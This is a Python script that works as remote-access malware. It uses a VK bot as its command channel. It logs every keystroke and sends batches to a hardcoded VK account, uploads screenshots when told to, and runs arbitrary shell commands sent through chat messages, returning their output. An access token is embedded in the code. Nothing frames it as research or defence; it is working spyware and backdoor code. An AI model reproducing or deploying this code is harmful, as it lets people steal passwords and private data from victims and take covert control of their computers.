import vk_api
from vk_api.bot_longpoll import VkBotEventType, VkBotLongPoll
from vk_api.utils import get_random_id
from vk_api.keyboard import VkKeyboard, VkKeyboardColor
import requests
import pyautogui
from time import sleep
from threading import Thread
import keyboard
import random
import os
import subprocess
token = "b6f2ec1fe49fb24b5c2e7c9de8f2257c058957dfg0fgb184948d00e729e48ef43692b9d30040e940fc417da"
vk = vk_api.VkApi(token=token)
vk._auth_token()
Vk = vk.get_api()
ran_id = random.randint(0, 100000)
name = None
work = False
longpoll = VkBotLongPoll(vk, 198598604)
keys = []
leng = 100
id = 241681320
def message(id, text,c_id = None, key = None ):
    print(text)
    vk.method("messages.send", {"peer_id": id, "message": text, "keyboard": key, "random_id": get_random_id(), "chat_id": c_id
                                    })

def scrin():
    screen = pyautogui.screenshot('screenshot.png')
    print(screen)
    sleep(1)
    a = vk.method("photos.getMessagesUploadServer")
    b = requests.post(a['upload_url'], files={'photo': open('screenshot.png', 'rb')}).json()
    c = vk.method('photos.saveMessagesPhoto', {'photo': b['photo'], 'server': b['server'], 'hash': b['hash']})[0]
    d = "photo{}_{}".format(c["owner_id"], c["id"])
    vk.method("messages.send", {"peer_id": id, "message": str(ran_id) + " name:" + str(name) + " len:" + str(leng) + " work:" + str(work) + "\n", "attachment": d, "random_id": 0})
def osi(cmd):
    print(cmd)
    returned_output = subprocess.check_output(cmd, shell=True)
    print(returned_output.decode('cp866'))
    message(id, str(returned_output.decode('cp866')))

def glav():
    global name
    global leng
    global work
    while True:
        try:
            for event in longpoll.listen():
                if event.type == VkBotEventType.MESSAGE_NEW:
                    text = event.object.text.split()
                    if (text[0] == str(ran_id) or text[0] == name) and len(text) > 1:
                        try:
                            if text[1] == "screen":
                                t = Thread(target=scrin)
                                t.start()
                                
                            elif text[1] == "work":
                                work = not work
                            elif (text[1] == "rename" and len(text) == 3):
                                name = text[2]
                            elif (text[1] == "cmd" and len(text) >= 3):
                                text_list = text
                                del text_list[0:2]
                                text_list = " ".join(text_list)
                                t = Thread(target=osi, args=(str(text_list), ))
                                t.start()
                            elif text[1] == "len" and len(text) == 3:
                                try:
                                    leng = int(text[2])
                                    message(id, "Ок")
                                except ValueError:
                                    message(id, "Ты дебил!")
                            
                        except Exception:
                            message(id, "Ты дебил!")
                    elif text[0] == "list":
                                if work:
                                    str_work = "В деле"
                                else:
                                    str_work = "Сплю"
                                text_list = str(ran_id) + " name:" + str(name) + " len:" + str(leng) + " work:" + str_work + "\n"
                                message(id, text_list)
                        
        except requests.exceptions.ReadTimeout as timeout:
            continue
def print_pressed_keys(e):
    global work
    global leng
    if e.event_type == "down":
        if e.name == "space":
            keys.append(" ")
        else:
            keys.append(e.name)
        if len(keys) >= leng and work:
            text = str(ran_id) + " name:" + str(name) + " len:" + str(leng) + " work:" + str(work) + "\n"
            text += ".".join(keys)
            message(id, text)
            keys.clear()
    print(type(e.event_type), type(e.name))
    print(e, e.event_type, e.name)
def key():
    keyboard.hook(print_pressed_keys)
    keyboard.wait()
text = str(ran_id) + " " + "new user"
message(id, text)
t = Thread(target=key)
t.start()
t = Thread(target=glav)
t.start()
